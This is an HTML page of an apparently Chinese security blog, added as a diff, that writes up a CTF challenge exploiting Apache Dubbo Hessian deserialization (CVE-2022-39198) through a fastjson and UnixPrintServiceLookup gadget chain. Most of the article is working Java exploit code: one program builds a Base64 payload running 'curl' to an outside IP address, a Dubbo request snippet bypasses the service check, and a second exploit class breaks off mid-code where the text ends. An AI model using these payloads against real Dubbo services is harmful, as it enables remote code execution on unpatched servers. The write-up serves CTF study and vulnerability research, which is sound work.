@@ -1,0 +1,495 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/default.png">
+  <link rel="icon" href="/img/default.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="KKfine&#39;s blog">
+  <meta name="keywords" content="">
+  
+  <title>dubboappCVE反序列化 - KKfine&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/atelier-estuary-light.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>KKfine's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/4.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="dubboappCVE反序列化">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2023-01-25 22:06" pubdate>
+        2023年1月25日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.9k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      33
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">dubboappCVE反序列化</h1>
+            
+            <div class="markdown-body">
+              <h1 id="i春秋冬季杯dubboapp"><a href="#i春秋冬季杯dubboapp" class="headerlink" title="i春秋冬季杯dubboapp"></a>i春秋冬季杯dubboapp</h1><p><a target="_blank" rel="noopener" href="https://tttang.com/archive/1730/">dubbo历史漏洞</a><br><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/kGcOY8xLCu9LDL6LoWm1Bw">从CVE-2022-39198到春秋杯冬季赛Dubboapp</a></p>
+<p>这题主要是考察CVE-2022-39198+不出网利用</p>
+<h2 id="NCTF2022"><a href="#NCTF2022" class="headerlink" title="NCTF2022"></a>NCTF2022</h2><p>思路比较统一，hessian反序列化中以equals作为起点，通过com.sun.org.apache.xpath.internal.objects.Xstring的equals触发任意类的toString。</p>
+<figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">getDefaultPrinterNameBSD:<span class="hljs-number">750</span>, UnixPrintServiceLookup (<span class="hljs-keyword">sun</span>.<span class="hljs-keyword">print</span>)<br>getDefaultPrintService:<span class="hljs-number">663</span>, UnixPrintServiceLookup (<span class="hljs-keyword">sun</span>.<span class="hljs-keyword">print</span>)<br><span class="hljs-keyword">write</span>:-<span class="hljs-number">1</span>, ASMSerializer_1_UnixPrintServiceLookup (<span class="hljs-keyword">com</span>.alibaba.fastjson.serializer)<br><span class="hljs-keyword">write</span>:<span class="hljs-number">271</span>, MapSerializer (<span class="hljs-keyword">com</span>.alibaba.fastjson.serializer)<br><span class="hljs-keyword">write</span>:<span class="hljs-number">44</span>, MapSerializer (<span class="hljs-keyword">com</span>.alibaba.fastjson.serializer)<br><span class="hljs-keyword">write</span>:<span class="hljs-number">312</span>, JSONSerializer (<span class="hljs-keyword">com</span>.alibaba.fastjson.serializer)<br>toJSONStrin<span class="hljs-variable">g:1077</span>, JSON (<span class="hljs-keyword">com</span>.alibaba.fastjson)<br>toStrin<span class="hljs-variable">g:1071</span>, JSON (<span class="hljs-keyword">com</span>.alibaba.fastjson)<br>equal<span class="hljs-variable">s:391</span>, XString (<span class="hljs-keyword">com</span>.<span class="hljs-keyword">sun</span>.org.apache.xpath.internal.objects)<br>equal<span class="hljs-variable">s:495</span>, AbstractMap (java.util)<br>putVa<span class="hljs-variable">l:635</span>, HashMap (java.util)<br><span class="hljs-keyword">pu</span><span class="hljs-variable">t:612</span>, HashMap (java.util)<br>doReadMap:<span class="hljs-number">145</span>, MapDeserializer (<span class="hljs-keyword">com</span>.alibaba.<span class="hljs-keyword">com</span>.caucho.hessian.io)<br>readMap:<span class="hljs-number">126</span>, MapDeserializer (<span class="hljs-keyword">com</span>.alibaba.<span class="hljs-keyword">com</span>.caucho.hessian.io)<br>readObjec<span class="hljs-variable">t:2733</span>, Hessian2Input (<span class="hljs-keyword">com</span>.alibaba.<span class="hljs-keyword">com</span>.caucho.hessian.io)<br>readObjec<span class="hljs-variable">t:2308</span>, Hessian2Input (<span class="hljs-keyword">com</span>.alibaba.<span class="hljs-keyword">com</span>.caucho.hessian.io)<br>main:<span class="hljs-number">85</span>, Test<br></code></pre></div></td></tr></table></figure>
+
+<p>前面的调用流程都比较熟悉。<br><img src="https://img-blog.csdnimg.cn/img_convert/09230941342ad61a761cbfe165794d81.png" srcset="/img/loading.gif" lazyload></p>
+<p>后面就是<code>UnixPrintServiceLookup</code>的调用流程<br><img src="https://img-blog.csdnimg.cn/img_convert/f489c9bf3396dee38dae121b9465b6bf.png" srcset="/img/loading.gif" lazyload></p>
+<blockquote>
+<p>我们需要进入这个if去触发红框中的方法，在jdk中这里的这些类都是和打印机相关的一些服务，这里这个if会判断打印服务有没有启动，启动了就直接执行连接，没有就会调用下面的逻辑去启动服务，才会有我们注入命令的可能。<br>可以看到如果连接成功就会返回true。经过我的测试，在mac，ubuntu中我们这种自用的电脑都大概率存在这个服务。会出现无法rce的情况，而服务器类特别是docker，不存在这样的服务所以就可以打通。</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/02cad56a026c4b365f6d396aa02440d6.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/afd377e7c7fb948a64ff737f4451a797.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/90d359b8fe27d0108de790500e9b3cf4.png" srcset="/img/loading.gif" lazyload></p>
+<p>最终exp</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.alibaba.com.caucho.hessian.io.Hessian2Input;<br><span class="hljs-keyword">import</span> com.alibaba.com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.alibaba.com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xpath.internal.objects.XString;<br><span class="hljs-keyword">import</span> org.apache.dubbo.common.io.Bytes;<br><span class="hljs-keyword">import</span> org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><span class="hljs-keyword">import</span> sun.print.UnixPrintServiceLookup;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Array;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.net.Socket;<br><span class="hljs-keyword">import</span> java.util.AbstractMap;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieldValue</span><span class="hljs-params">(Object obj, String filedName, Object value)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException </span>&#123;<br>        Field declaredField = obj.getClass().getDeclaredField(filedName);<br>        declaredField.setAccessible(<span class="hljs-keyword">true</span>);<br>        declaredField.set(obj, value);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//需要执行的命令</span><br>            String cmd = <span class="hljs-string">&quot;curl http://39.107.239.30:7777&quot;</span>;<br>            Field theUnsafe = Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>            theUnsafe.setAccessible(<span class="hljs-keyword">true</span>);<br>            Unsafe unsafe = (Unsafe) theUnsafe.get(<span class="hljs-keyword">null</span>);<br>            Object unixPrintServiceLookup = unsafe.allocateInstance(UnixPrintServiceLookup.class);<br>            <span class="hljs-comment">//绕过getDefaultPrinterNameBSD中的限制</span><br>            <span class="hljs-comment">//设置属性</span><br>            setFieldValue(unixPrintServiceLookup, <span class="hljs-string">&quot;cmdIndex&quot;</span>, <span class="hljs-number">0</span>);<br>            setFieldValue(unixPrintServiceLookup, <span class="hljs-string">&quot;osname&quot;</span>, <span class="hljs-string">&quot;xx&quot;</span>);<br>            setFieldValue(unixPrintServiceLookup, <span class="hljs-string">&quot;lpcFirstCom&quot;</span>, <span class="hljs-keyword">new</span> String[]&#123;cmd, cmd, cmd&#125;);<br>            <span class="hljs-comment">//封装一个JSONObject对象调用getter方法</span><br>            JSONObject jsonObject = <span class="hljs-keyword">new</span> JSONObject();<br>            jsonObject.put(<span class="hljs-string">&quot;xx&quot;</span>, unixPrintServiceLookup);<br>            <span class="hljs-comment">//使用XString类调用toString方法</span><br>            XString xString = <span class="hljs-keyword">new</span> XString(<span class="hljs-string">&quot;xx&quot;</span>);<br>            HashMap map1 = <span class="hljs-keyword">new</span> HashMap();<br>            HashMap map2 = <span class="hljs-keyword">new</span> HashMap();<br>            map1.put(<span class="hljs-string">&quot;yy&quot;</span>,jsonObject);<br>            map1.put(<span class="hljs-string">&quot;zZ&quot;</span>,xString);<br>            map2.put(<span class="hljs-string">&quot;yy&quot;</span>,xString);<br>            map2.put(<span class="hljs-string">&quot;zZ&quot;</span>,jsonObject);<br><br>            HashMap s = <span class="hljs-keyword">new</span> HashMap();<br>            setFieldValue(s, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">2</span>);<br>            Class nodeC;<br>            <span class="hljs-keyword">try</span> &#123;<br>                nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Node&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">catch</span> ( ClassNotFoundException e ) &#123;<br>                nodeC = Class.forName(<span class="hljs-string">&quot;java.util.HashMap$Entry&quot;</span>);<br>            &#125;<br>            Constructor nodeCons = nodeC.getDeclaredConstructor(<span class="hljs-keyword">int</span>.class, Object.class, Object.class, nodeC);<br>            nodeCons.setAccessible(<span class="hljs-keyword">true</span>);<br><br>            Object tbl = Array.newInstance(nodeC, <span class="hljs-number">2</span>);<br>            Array.set(tbl, <span class="hljs-number">0</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, map1, map1, <span class="hljs-keyword">null</span>));<br>            Array.set(tbl, <span class="hljs-number">1</span>, nodeCons.newInstance(<span class="hljs-number">0</span>, map2, map2, <span class="hljs-keyword">null</span>));<br>            setFieldValue(s, <span class="hljs-string">&quot;table&quot;</span>, tbl);<br><br>            ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>            Hessian2Output hessianOutput = <span class="hljs-keyword">new</span> Hessian2Output(byteArrayOutputStream);<br>            hessianOutput.setSerializerFactory(<span class="hljs-keyword">new</span> SerializerFactory());<br>            hessianOutput.getSerializerFactory().setAllowNonSerializable(<span class="hljs-keyword">true</span>);<br>            hessianOutput.writeObject(s);<br>            hessianOutput.flushBuffer();<br><br>            <span class="hljs-keyword">byte</span>[] code = byteArrayOutputStream.toByteArray();<br>            String payload = Base64.getEncoder().encodeToString(code);<br>            System.out.println(payload);<br><br>            ByteArrayInputStream ins = <span class="hljs-keyword">new</span> ByteArrayInputStream(code);<br>            Hessian2Input input = <span class="hljs-keyword">new</span> Hessian2Input(ins);<br>            input.readObject();<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure>
+
+<h2 id="dubboapp"><a href="#dubboapp" class="headerlink" title="dubboapp"></a>dubboapp</h2><p>在<code>DecodeableRpcInvocation.decode() (org.apache.dubbo.rpc.protocol.dubbo)</code>打断点。<br><img src="https://img-blog.csdnimg.cn/img_convert/8567b7c51e5c75469b0d5fd630ee9f15.png" srcset="/img/loading.gif" lazyload></p>
+<p>首先需要经过<code>checkSerialization</code>检查。如果该方法中当根据指定的serviceKey无法获得服务提供者暴露服务的对象就会报错。结合CVE-2020-1948相关的绕过信息,解决这个问题得相关代码如下。</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">out.writeUTF(<span class="hljs-string">&quot;xxxxx&quot;</span>);<br>out.writeUTF(<span class="hljs-string">&quot;org.apache.dubbo.registry.RegistryService&quot;</span>);<br>out.writeUTF(<span class="hljs-string">&quot;0.0.0&quot;</span>);<br>out.writeUTF(<span class="hljs-string">&quot;$echo&quot;</span>);<br>out.writeUTF(<span class="hljs-string">&quot;Ljava/lang/Object;&quot;</span>);<br>out.writeObject(jo);<br>HashMap hkhash = <span class="hljs-keyword">new</span> HashMap();<br>hkhash.put(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;bbb&quot;</span>);<br></code></pre></div></td></tr></table></figure>
+<p>后面会走到<br><img src="https://img-blog.csdnimg.cn/img_convert/e5ea98a3e2c6b0b26f5b0319f6ef640a.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后在<code>decode()</code>函数种会进入到报错，在拼接过程中将<code>org.apache.dubbo.rpc.protocol.dubbo.DecodeableRpcInvocation</code>类对象当成字符串<br><img src="https://img-blog.csdnimg.cn/img_convert/a9082851e7fcca29316e1820ce4cd0f4.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (exporter == <span class="hljs-keyword">null</span>) &#123;<br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RemotingException(channel, <span class="hljs-string">&quot;Not found exported service: &quot;</span> + serviceKey + <span class="hljs-string">&quot; in &quot;</span> + exporterMap.keySet() + <span class="hljs-string">&quot;, may be version or group mismatch &quot;</span> +<br>            <span class="hljs-string">&quot;, channel: consumer: &quot;</span> + channel.getRemoteAddress() + <span class="hljs-string">&quot; --&gt; provider: &quot;</span> + channel.getLocalAddress() + <span class="hljs-string">&quot;, message:&quot;</span> + getInvocationWithoutData(inv));<br>&#125;<br><br></code></pre></div></td></tr></table></figure>
+
+<p>最终在<code>DecodeableRpcInvocation</code>类得<code>toStrin</code>函数中触发<code>JSONObject</code>得tostring函数<br><img src="https://img-blog.csdnimg.cn/img_convert/2c450fac4ab137befd2bef1b40e9ae2a.png" srcset="/img/loading.gif" lazyload></p>
+<p>后续得调用过程就比较类似了，大致如下。</p>
+<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span><span class="hljs-selector-class">.protocol</span><span class="hljs-selector-class">.dubbo</span>.DecodeableRpcInvocation<span class="hljs-number">#dec</span>ode<br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span><span class="hljs-selector-class">.protocol</span><span class="hljs-selector-class">.dubbo</span>.DubboProtocol#getInvoker<br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.dubbo</span><span class="hljs-selector-class">.rpc</span>.RpcInvocation#toString<br>com<span class="hljs-selector-class">.alibaba</span><span class="hljs-selector-class">.fastjson</span>.JSON#toString<br>sun<span class="hljs-selector-class">.print</span>.UnixPrintServiceLookup#getDefaultPrintService<br>...<br>Runtime<span class="hljs-selector-class">.getRuntime</span>()<span class="hljs-selector-class">.exec</span>()<br></code></pre></div></td></tr></table></figure>
+
+<p>不过当时得题目中还有不出网，这部分看看网上wp没环境了。exp直接拿的作者的小改了一下。</p>
+<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><br><span class="hljs-keyword">package</span> com.company;<br><br><span class="hljs-keyword">import</span> com.alibaba.com.caucho.hessian.io.Hessian2Output;<br><span class="hljs-keyword">import</span> com.alibaba.com.caucho.hessian.io.SerializerFactory;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONObject;<br><span class="hljs-keyword">import</span> org.apache.dubbo.common.io.Bytes;<br><span class="hljs-keyword">import</span> org.apache.dubbo.common.serialize.hessian2.Hessian2ObjectOutput;<br><span class="hljs-keyword">import</span> org.apache.dubbo.common.serialize.hessian2.Hessian2SerializerFactory;<br><span class="hljs-keyword">import</span> sun.misc.Unsafe;<br><span class="hljs-keyword">import</span> sun.print.UnixPrintServiceLookup;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.net.Socket;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Random;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> org.apache.dubbo.common.utils.FieldUtils.setFieldValue;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exploit3</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br><br>        ByteArrayOutputStream byteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        <span class="hljs-keyword">byte</span>[] header = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[<span class="hljs-number">16</span>];<br>        Bytes.short2bytes((<span class="hljs-keyword">short</span>) <span class="hljs-number">0xdabb</span>, header);<br>        header[<span class="hljs-number">2</span>] = (<span class="hljs-keyword">byte</span>) ((<span class="hljs-keyword">byte</span>) <span class="hljs-number">0x80</span> | <span class="hljs-number">2</span>);<br>        Bytes.long2bytes(<span class="hljs-keyword">new</span> Random().nextInt(<span class="hljs-number">100000000</span>), header, <span class="hljs-number">4</span>);<br><br>        ByteArrayOutputStream hessian2ByteArrayOutputStream = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br><span class="hljs-comment">//        Hessian2Output out = new Hessian2Output(byteArrayOutputStream);</span><br><span class="hljs-comment">//        out.setSerializerFactory(new SerializerFactory());</span><br>        Hessian2ObjectOutput out = <span class="hljs-keyword">new</span> Hessian2ObjectOutput(hessian2ByteArrayOutputStream);<br><span class="hljs-comment">//        out.getClass().getSerializerFactory().setAllowNonSerializable(true);</span><br><span class="hljs-comment">/////////############################################</span><br><br>        Field theUnsafe = Unsafe.class.getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        theUnsafe.setAccessible(<span class="hljs-keyword">true</span>);<br>        Unsafe unsafe = (Unsafe) theUnsafe.get(<span class="hljs-keyword">null</span>);<br>        Object unix = unsafe.allocateInstance(UnixPrintServiceLookup.class);<br>        setFieldValue(unix, <span class="hljs-string">&quot;osname&quot;</span>,<span 